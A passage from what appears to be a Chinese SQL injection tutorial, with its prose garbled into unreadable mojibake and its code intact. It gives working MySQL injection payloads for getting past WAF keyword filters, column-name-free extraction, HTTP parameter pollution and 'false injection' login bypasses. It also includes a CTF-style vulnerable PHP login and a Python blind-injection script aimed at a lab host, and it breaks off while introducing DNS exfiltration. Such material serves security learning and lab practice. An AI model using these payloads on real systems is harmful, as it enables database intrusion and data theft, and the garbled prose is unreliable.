user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));\n```\n\n**è¿‡æ»¤information_schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥**\n\nå½“è¿‡æ»¤oræ—¶ï¼Œè¿™ä¸ªåº“å°±ä¼šè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆmysqlåœ¨è¢«wafç¦æ‰äº†information_schemaåº“åè¿˜èƒ½æœ‰å“ªäº›åˆ©ç”¨æ€è·¯å‘¢ï¼Ÿ\n\ninformation_schema ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªåº“åœ¨mysqlä¸­å°±æ˜¯ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œå®ƒä¿å­˜ç€mysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰ã€‚åœ¨æ³¨å…¥ä¸­ï¼Œinfromation_schemaåº“çš„ä½œç”¨æ— éå°±æ˜¯å¯ä»¥è·å–åˆ°table_schemaã€table_nameã€column_nameè¿™äº›æ•°æ®åº“å†…çš„ä¿¡æ¯ã€‚\n\nèƒ½å¤Ÿä»£æ›¿information_schemaçš„æœ‰ï¼š\nsys.schema_auto_increment_columns åªæ˜¾ç¤ºæœ‰è‡ªå¢çš„è¡¨\nsys.schema_table_statistics_with_buffer\nx$schema_table_statistics_with_buffer\n```bash\nselect * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();\n```\nmysql.innodb_table_stats\nmysql.innodb_table_index\n\nä»¥ä¸Šå¤§éƒ¨åˆ†ç‰¹æ®Šæ•°æ®åº“éƒ½æ˜¯åœ¨ mysql5.7 ä»¥åçš„ç‰ˆæœ¬æ‰æœ‰ï¼Œå¹¶ä¸”è¦è®¿é—®sysæ•°æ®åº“éœ€è¦æœ‰ç›¸åº”çš„æƒé™ã€‚\n\nä½†æ˜¯åœ¨ä½¿ç”¨ä¸Šé¢çš„åä¸¤ä¸ªè¡¨æ¥è·å–è¡¨åä¹‹åselect group_concat(table_name) from mysql.innodb_table_statsï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è·å¾—åˆ—çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦é‡‡ç”¨æ— åˆ—åæ³¨å…¥çš„åŠæ³•ã€‚\n\n### æ— åˆ—åæ³¨å…¥\n123æ³•\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›æŸ¥è¯¢ä¸Šçš„æŠ€å·§æ¥è¿›è¡Œæ— åˆ—åã€è¡¨åçš„æ³¨å…¥ã€‚\n\nåœ¨æˆ‘ä»¬ç›´æ¥select 1,2,3æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„è¡¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png)\n\nå¦‚å›¾æ‰€è§åˆ—åä¼šè¢«å®šä¹‰ä¸º1ï¼Œ2ï¼Œ3\n\nå½“æˆ‘ä»¬ç»“åˆäº†unionè”åˆæŸ¥è¯¢ä¹‹å\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png)\n\nå¦‚å›¾ï¼Œæˆ‘ä»¬çš„åˆ—åè¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„æ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ•°å­—æ¥å¯¹åº”åˆ—ï¼Œå¦‚ 3 å¯¹åº”äº†è¡¨é‡Œé¢çš„ passwordï¼Œè¿›è€Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢è¯­å¥æ¥æŸ¥è¯¢passwordï¼š\n```bash\nselect `3` from (select 1,2,3 union select * from users)a;\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png)\næœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½å\n\nå½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œåå¼•å·ä¼šè¢«è¿‡æ»¤ã€‚å½“åå¼•å·ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š\n\n```bash\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\njoin\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨çˆ†é”™ï¼Œå€ŸåŠ©joinå’Œusingçˆ†å‡ºåˆ—åï¼Œidä¸ºç¬¬ä¸€åˆ—ï¼Œusernameä¸ºç¬¬äºŒåˆ—ï¼Œå¯ä»¥é€ä¸ªçˆ†å‡ºï¼Œçˆ†å‡ºå…¨éƒ¨åˆ—åä¹‹åå³å¯å¾—åˆ°åˆ—å†…æ•°æ®ã€‚\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png)\n\n### è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡\nè¿‡æ»¤ if è¯­å¥ç»•è¿‡\nå¦‚æœè¿‡æ»¤äº† if å…³é”®å­—çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨case whenè¯­å¥ç»•è¿‡ï¼š\n\n```bash\nif(condition,1,0) <=> case when condition then 1 else 0 end\n```\n\nä¸‹é¢çš„ifè¯­å¥å’Œcase whenè¯­å¥æ˜¯ç­‰æ•ˆçš„ï¼š\n\n```bash\n0' or if((ascii(substr((select database()),1,1))>97),1,0)#\n\n0' or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#\n```\n\n### è¿‡æ»¤ substr ç»•è¿‡\n- ä½¿ç”¨ lpad/lpad\nä½¿ç”¨lpad()å’Œrpad()ç»•è¿‡substr()\n```bash\nselect lpad((select database()),1,1)    // s\nselect lpad((select database()),2,1)    // se\nselect lpad((select database()),3,1)    // sec\nselect lpad((select database()),4,1)    // secu\nselect lpad((select database()),5,1)    // secur\nselect lpad((select database()),6,1)    // securi\nselect lpad((select database()),7,1)    // securit\nselect lpad((select database()),8,1)    // security\n\nselect rpad((select database()),1,1)    // s\nselect rpad((select database()),2,1)    // se\nselect rpad((select database()),3,1)    // sec\nselect rpad((select database()),4,1)    // secu\nselect rpad((select database()),5,1)    // secur\nselect rpad((select database()),6,1)    // securi\nselect rpad((select database()),7,1)    // securit\nselect rpad((select database()),8,1)    // security\n```\nlpadï¼šå‡½æ•°è¯­æ³•ï¼šlpad(str1,length,str2)ã€‚å…¶ä¸­str1æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œlengthæ˜¯ç»“æœå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œstr2æ˜¯ä¸€ä¸ªå¡«å……å­—ç¬¦ä¸²ã€‚å¦‚æœstr1çš„é•¿åº¦æ²¡æœ‰lengthé‚£ä¹ˆé•¿ï¼Œåˆ™ä½¿ç”¨str2å¡«å……ï¼›å¦‚æœstr1çš„é•¿åº¦å¤§äºlengthï¼Œåˆ™æˆªæ–­ã€‚\nrpadï¼šåŒç†\n\n- ä½¿ç”¨left()ç»•è¿‡substr()\n```bash\nselect left((select database()),1)    // s\nselect left((select database()),2)    // se\nselect left((select database()),3)    // sec\nselect left((select database()),4)    // secu\nselect left((select database()),5)    // secur\nselect left((select database()),6)    // securi\nselect left((select database()),7)    // securit\nselect left((select database()),8)    // security\n```\n\n- ä½¿ç”¨mid()ç»•è¿‡substr()\n\nmid()å‡½æ•°çš„ä½¿ç”¨å°±å’Œsubstr()å‡½æ•°ä¸€æ ·äº†ï¼š\n\n```bash\nselect mid((select database()),1,1)    // s\nselect mid((select database()),2,1)    // e\nselect mid((select database()),3,1)    // c\nselect mid((select database()),4,1)    // u\nselect mid((select database()),5,1)    // r\n......\n```\n\n- è¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿ç»•è¿‡\n```bash\nselect insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s\nselect insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e\nselect insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c\nselect insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u\nselect insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r\nselect insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i\nselect insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t\n......\n```\nINSERT( string , position , number , string2 )\n\nINSERT()å‡½æ•°åœ¨æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ä¸­æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ’å…¥ä¸€å®šæ•°é‡çš„å­—ç¬¦ã€‚\n\n### HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´ç»•è¿‡ Waf\nHPPæ˜¯HTTP Parameter Pollutionçš„ç¼©å†™ï¼Œæ„ä¸ºHTTPå‚æ•°æ±¡æŸ“ã€‚æµè§ˆå™¨åœ¨è·ŸæœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¾€å¾€ä¼šåœ¨GETæˆ–POSTè¯·æ±‚é‡Œé¢å¸¦ä¸Šå‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šä»¥ é”®-å€¼ å¯¹çš„å½¢åŠ¿å‡ºç°ï¼Œé€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒæ ·åç§°çš„å‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ã€‚\n\nä½†æ˜¯åœ¨HTTPåè®®ä¸­æ˜¯å…è®¸åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼šhttp://www.baidu.com?name=aa&name=bbï¼Œé’ˆå¯¹åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„æƒ…å†µï¼Œä¸åŒçš„æœåŠ¡å™¨çš„å¤„ç†æ–¹å¼ä¼šä¸ä¸€æ ·ã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ name=aaã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ name=bbã€‚æœ‰çš„æœåŠ¡å™¨ä¸¤ä¸ªå‚æ•°éƒ½å–ï¼Œä¹Ÿå°±æ˜¯ name=aa,bbã€‚è¿™ç§ç‰¹æ€§åœ¨ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é€»è¾‘åˆ¤æ–­æ—¶ï¼Œéå¸¸æœ‰ç”¨ã€‚\n\nHPPæ¼æ´ï¼Œä¸WebæœåŠ¡å™¨ç¯å¢ƒã€æœåŠ¡ç«¯ä½¿ç”¨çš„è„šæœ¬æœ‰å…³ã€‚å¦‚ä¸‹æ˜¯ä¸åŒç±»å‹çš„WebæœåŠ¡å™¨å¯¹äºå‡ºç°å¤šä¸ªå‚æ•°æ—¶çš„é€‰æ‹©ï¼š\n\n|  è¡¨å¤´Web æœåŠ¡å™¨|å‚æ•°è·å–å‡½æ•° | è·å–åˆ°çš„å‚æ•° |\n|  ----  | ----  | ---- | \n|   PHP/Apache|\t$_GET['a']|\tLast  | \n| JSP/Tomcat|\tRequest.getParameter('a')|\tFirst|\n|Perl(CGI)/Apache\t|Param('a')\t|First|\n|Python/Apache\t|getvalue('a')\t|All|\n|ASP/IIS|\tRequest.QueryString('a')|\tAll   |\n\nå‡è®¾æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯Tomcatä¸ºå¼•æ“çš„JSP/Tomcatå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯Apacheä¸ºå¼•æ“çš„PHP/Apacheå‹æœåŠ¡å™¨ã€‚ç¬¬ä¸€éƒ¨åˆ†çš„JSP/TomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFï¼Œè€ŒçœŸæ­£æä¾›WebæœåŠ¡çš„æ˜¯PHP/ApacheæœåŠ¡å™¨ã€‚é‚£ä¹ˆæœåŠ¡ç«¯çš„å·¥ä½œæµç¨‹ä¸ºï¼šå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°JSP/TomcatæœåŠ¡å™¨ï¼Œç„¶åJSP/TomcatæœåŠ¡å™¨å†å‘PHP/ApacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚\n\né‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ä¸åŒæœåŠ¡å™¨è§£æå‚æ•°çš„ä½ç½®ä¸åŒç»•è¿‡WAFçš„æ£€æµ‹ã€‚æ¥çœ‹çœ‹å¦‚ä¸‹è¯·æ±‚ï¼š\n```bash\nindex.jsp?id=1&id=2\n```\n\nå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡JSP/TomcatæœåŠ¡å™¨ï¼ŒJSP/TomcatæœåŠ¡å™¨è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥JSP/TomcatæœåŠ¡å™¨å»è¯·æ±‚PHP/ApacheæœåŠ¡å™¨ï¼ŒPHP/ApacheæœåŠ¡å™¨è§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚å‡è®¾JSP/TomcatæœåŠ¡å™¨ä½œä¸ºWafå¯¹ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ£€æµ‹ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ payloadæ¥ç»•è¿‡Wafã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\n/index.jsp?id=1&id=-1' union select 1,database(),3--+\n```\n\nè¿™æ · Waf å¯èƒ½åªæ£€æµ‹ç¬¬ä¸€ä¸ªå‚æ•° id=1ï¼Œè€ŒPHPè„šæœ¬çœŸæ­£è¯†åˆ«çš„æ˜¯ id=select database()--+\n[ä¾‹é¢˜]Sql-Labs Less-29\n\n### False æ³¨å…¥ç»•è¿‡\n**False æ³¨å…¥åŸç†**\nå‰é¢æˆ‘ä»¬å­¦è¿‡çš„æ³¨å…¥éƒ½æ˜¯åŸºäº1=1è¿™æ ·æ¯”è¾ƒçš„æ™®é€šæ³¨å…¥ï¼Œä¸‹é¢æ¥è¯´ä¸€è¯´ False æ³¨å…¥ï¼Œåˆ©ç”¨ False æˆ‘ä»¬å¯ä»¥ç»•è¿‡ä¸€äº›ç‰¹å®šçš„ WAF ä»¥åŠä¸€äº›æœªæ¥ä¸ç¡®å®šçš„å› ç´ ã€‚\n\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªsqlæŸ¥è¯¢è¯­å¥ï¼š\n```bash\nselect * from user where uesrname = 0;\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png)\n\n\nä¸ºä»€ä¹ˆ username = 0 ä¼šå¯¼è‡´è¿”å›æ•°æ®ï¼Œè€Œä¸”æ˜¯å…¨éƒ¨æ•°æ®å‘¢ï¼Ÿ\n\nè¿™å°±æ˜¯ä¸€ä¸ªåŸºäº False æ³¨å…¥çš„ä¾‹å­ï¼Œä¸‹é¢å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼š\n```bash\nselect * from user where username = 0;\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png)\n\n\nå’Œä¸Šé¢æ˜¯åŒä¸€ä¸ªè¡¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œåªè¿”å›äº†ä¸¤ç»„æ•°æ®å‘¢ï¼Ÿè¯´åˆ°è¿™é‡Œä¸å¾—ä¸è¯´ä¸€è¯´æœ‰å…³äº MYSQL çš„éšå¼ç±»å‹è½¬æ¢ã€‚\n\nMYSQL çš„éšå¼ç±»å‹è½¬æ¢ï¼Œå³å½“å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²è½¬ä¸ºæµ®ç‚¹æ•°ï¼Œè€Œå­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°å¾ˆæ˜æ˜¾ä¼šè½¬æ¢å¤±è´¥ï¼Œè¿™æ—¶å°±ä¼šäº§ç”Ÿä¸€ä¸ªwarningï¼Œè½¬æ¢çš„ç»“æœä¸º0ï¼Œç„¶å0 = 0 è¿”å›çš„æ˜¯ True ï¼Œè¿™æ ·å°±å°†è¡¨ä¸­çš„æ•°æ®å…¨éƒ¨è¿”å›äº†ã€‚ä½†å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æ˜¯æ•°å­—è¯è¿˜æ˜¯ä¼šä»æ•°å­—éƒ¨åˆ†æˆªæ–­ï¼Œè½¬æ¢ä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œpasswd å­—æ®µä¸­æœ‰ä¸€ä¸ªå€¼æ˜¯ä»¥æ•°å­—1å¼€å¤´çš„å¹¶éä¸º0ï¼Œå†è¿›è¡Œ passwd = 0 æ¯”è¾ƒæ—¶ï¼Œä¼šä»1å¼€å§‹æˆªæ–­ï¼Œ1 = 0 ä¸æˆç«‹ï¼Œå½“ç„¶å°±åªè¿”å›ä¸¤æ¡æ•°æ®äº†ã€‚è¿™å°±æ˜¯ MYSQL False æ³¨å…¥çš„åŸç†ã€‚\n\n**False æ³¨å…¥åˆ©ç”¨**\nä¸‹é¢æˆ‘ä»¬è®²è®² False æ³¨å…¥å¦‚ä½•åˆ©ç”¨ï¼ŒåŠå¦‚ä½•æ„é€  False æ³¨å…¥çš„åˆ©ç”¨ç‚¹ã€‚åœ¨å®é™…ä¸­æˆ‘ä»¬æ¥è§¦åˆ°çš„è¯­å¥éƒ½æ˜¯å¸¦æœ‰å¼•å·çš„ï¼Œå¦‚ä¸‹ï¼š\n```bash\nselect * from user where username ='.$username.';\n```\n\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å¼•å·æ„é€ å‡º 0 è¿™ä¸ªå€¼å‘¢ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›å¤„ç†æ¥æ„é€ falseæ³¨å…¥çš„åˆ©ç”¨ç‚¹ï¼Ÿ\n\nå¯ä»¥ä½¿ç”¨çš„å§¿åŠ¿æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä¸‹é¢çš„ç®—æ•°è¿ç®—ï¼š\n\n- åˆ©ç”¨ç®—æ•°è¿ç®—\nåŠ ï¼š+\n```bash\næ’å…¥'+', æ‹¼æ¥çš„è¯­å¥: select * from user where username =''+'';\n\n```\nå‡ï¼š-\n```bash\næ’å…¥'-', æ‹¼æ¥çš„è¯­å¥: select * from user where username =''-'';\n```\n\nä¹˜ï¼š*\n```bash\næ’å…¥'*', æ‹¼æ¥çš„è¯­å¥: select * from user where username =''*'';\n```\n\né™¤ï¼š/\n```bash\næ’å…¥'/6#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =''/6#';\n```\n\nå–ä½™ï¼š%\n```bash\næ’å…¥'%1#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =''%1#';\n```\n\n- åˆ©ç”¨ä½æ“ä½œè¿ç®—\næˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿ç®—çš„æ—¶å€™ç±»å‹è½¬æ¢çš„é—®é¢˜è¿›è¡Œåˆ©ç”¨ã€‚\nå’Œè¿ç®—ï¼š&\n```bash\næ’å…¥'&0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =''&0#';\n```\n\næˆ–è¿ç®—ï¼š|\n```bash\næ’å…¥'|0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =''|0#';\n```\n\nå¼‚æˆ–è¿ç®—ï¼š^\n```bash\næ’å…¥'^0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =''^0#';\n```\n\nç§»ä½æ“ä½œï¼š\n```bash\næ’å…¥'<<0# æˆ– '>>0#, æ‹¼æ¥çš„è¯­å¥: \nselect * from user where username =''<<0#';\nselect * from user where username =''>>0#';  \n```\n\n- åˆ©ç”¨æ¯”è¾ƒè¿ç®—ç¬¦\nå®‰å…¨ç­‰äºï¼š<=>\n```bash\n'=0<=>1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=''=0<=>1#'\n```\n\nä¸ç­‰äº<>(!=)\n```bash\n'=0<>0# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=''=0<>0#'\n```\n\nå¤§å°äº>æˆ–<\n```bash\n'>-1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=''>-1#\n```\n\n\n- å…¶ä»–\n```bash\n+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1\n```\n\n- ç»¼åˆåˆ©ç”¨\nfalseæ³¨å…¥è¿™ç§æ³¨å…¥æ–¹å¼æœ‰çš„ä¼˜åŠ¿å°±æ˜¯ï¼Œåœ¨æŸäº›ç‰¹å®šæ—¶å€™å¯ä»¥ç»•è¿‡WAFæˆ–è€…æ˜¯ä¸€äº›å…¶ä»–çš„ç»•è¿‡ã€‚\n\nè¿™é‡Œä¸¾ä¾‹ä¸€é“é¢˜\n```php\n<?php  \ninclude(\"config.php\");  \n$conn ->query(\"set names utf8\");  \n\nfunction randStr($lenth=32){\n     $strBase = \"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\";\n     $str = \"\";\n     while($lenth>0){\n       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);\n       $lenth --;\n     }\n    return $str;\n}\nif($install){\n     $sql = \"create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci \";\n     if($conn->query($sql)){\n        $sql  = \"insert into `user`(`username`,`passwd`,`role`) values ('admin','\".md5(randStr()).\"','admin')\";\n        $conn -> query($sql);\n     }\n }  \n\nfunction filter($str){\n      $filter = \"/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\";\n      if(preg_match($filter,$str)){\n          die(\"you can't input this illegal char!\");\n      }\n      return $str;\n  }   \n\nfunction show($username){\n   global $conn;\n   $sql = \"select role from `user` where username ='\".$username.\"'\";\n   $res = $conn ->query($sql);\n   if($res->num_rows>0){\n        echo \"$username is \".$res->fetch_assoc()['role'];\n   }else{\n        die(\"Don't have this user!\");\n   }\n }  \n\nfunction login($username,$passwd){\n     global $conn;\n     global $flag;\n     $username = trim(strtolower($username));\n     $passwd = trim(strtolower($passwd));\n     if($username == 'admin'){\n         die(\"you can't login this as admin!\");\n     }  \n     $sql = \"select * from `user` where username='\".$conn->escape_string($username).\"' and passwd='\".$conn->escape_string($passwd).\"'\";\n     $res = $conn ->query($sql);\n     if($res->num_rows>0){\n           if($res->fetch_assoc()['role'] === 'admin') exit($flag);\n     }else{ \n           echo \"sorry,username or passwd error!\";\n     }\n }\n  function source(){\n      highlight_file(__FILE__);\n }\n  $username = isset($_POST['username'])?filter($_POST['username']):\"\";\n  $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):\"\";\n  $action = isset($_GET['action'])?filter($_GET['action']):\"source\";\n\nswitch($action){\n    case \"source\": source(); break ;\n    case \"login\" : login($username,$passwd);break;\n    case \"show\" : show($username);break; \n}\n```\næˆ‘ä»¬æ³¨æ„åˆ°filter()å‡½æ•°\n```bash\n$filter = \"/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\";\n```\n\nè¿™é‡Œçœ‹èµ·æ¥è¿‡æ»¤çš„æ¯”è¾ƒå¤šï¼Œå…¶ä¸­andï¼Œorè¿˜æœ‰&ï¼Œ|éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨falseè¿›è¡Œç›²æ³¨ã€‚\n\nå¯ä»¥åœ¨showå‡½æ•°åˆ©ç”¨æŸ¥è¯¢çš„æ—¶å€™æ³¨å…¥ï¼Œ\n```bash\nusername = \"admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1\"\n```\nè¿™é‡Œå®˜æ–¹ç»™å‡ºçš„å°±æ˜¯åˆ©ç”¨å¼‚æˆ–ï¼Œå…¶å®è¿™é‡Œå¹¶ä¸éœ€è¦ admin åªè¦æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²å°±å¯ä»¥\n\nå¼‚æˆ–ä¼šä½¿å­—ç¬¦ä¸²éƒ½è½¬ä¸ºæµ®ç‚¹å‹ï¼Œéƒ½å˜ä¸ºäº†0ï¼Œç”±äº0=0^0 -> 1^0 -> 1 å½“ç„¶å¯¹äºè¿™ä¸ªé¢˜å¹¶ä¸ä¸€å®šåˆ©ç”¨è¿™ä¸ªï¼Œç›´æ¥æˆªå–å­—ç¬¦ä¸²ä½œæ¯”è¾ƒå°±å¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯æä¾›ä¸€ç§å§¿åŠ¿ï¼Œç”±äºmysqlçš„çµæ´»ï¼Œå…¶èŠ±æ ·ä¹Ÿæ¯”è¾ƒå¤šè¿˜æœ‰å°±æ˜¯æ„é€ çš„payloadæ¯”è¾ƒç®€çŸ­ï¼Œä¾‹å¦‚'+'ã€'^'ã€'/4#' è¿™æ ·åªæœ‰ä¸‰ä¸ªå­—ç¬¦ä¾¿å¯ä»¥ç»•è¿‡ç™»å½•ï¼Œç®€å•ç²—æš´ï¼Œè¿˜æœ‰å°±æ˜¯ç±»ä¼¼çš„æ–‡ç« ä¸å¤šï¼Œè®¸å¤šå¼€å‘äººå‘˜å®¹æ˜“å¿½è§†è¿™äº›ç»†èŠ‚ã€‚\n\n**ç›²æ³¨è„šæœ¬**\n```python\nimport requests\n\nflag = ''\n\nfor i in range(1,33):\n    for str in \"abcdefghijklmnopkrstuvwxyz\":\n        url = \"http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id='^(mid((select database())from(-{0}))='{1}')='1\".format(i,str+flag)\n        res = requests.get(url=url)\n        if \"You are in...........\" in res.text:\n            flag = str+flag\n            print(flag)\n```\n\n\n### DNSæ³¨å…¥\n**åŸç†**\né€šè¿‡å­æŸ¥è¯¢ï¼Œå°†å†…å®¹æ‹¼æ¥åˆ°åŸŸåå†…ï¼Œè®©load_file()å»è®¿é—®å…±äº«æ–‡ä»¶ï¼Œè®¿é—®çš„åŸŸåè¢«è®°å½•æ­¤æ—¶å˜ä¸ºæ˜¾é”™æ³¨å…¥,å°†ç›²æ³¨å˜æ˜¾é”™æ³¨å…¥,è¯»å–è¿œç¨‹å…±äº«æ–‡ä»¶ï¼Œé€šè¿‡æ‹¼æ¥å‡ºå‡½æ•°åšæŸ¥è¯¢,æ‹¼æ¥åˆ°åŸŸåä¸­ï¼Œè®¿é—®æ—¶å°†è®¿é—®æœåŠ¡å™¨ï¼Œè®°å½•åæŸ¥çœ‹æ—¥å¿—ã€‚\n\nåœ¨æ— æ³•ç›´æ¥åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡DNSè¯·æ±‚,é€šè¿‡DNSlogï¼ŒæŠŠæ•°æ®å¤–å¸¦ï¼Œç”¨DNSè§£æè®°å½•æŸ¥çœ‹ã€‚\n\nLOAD_FILE() 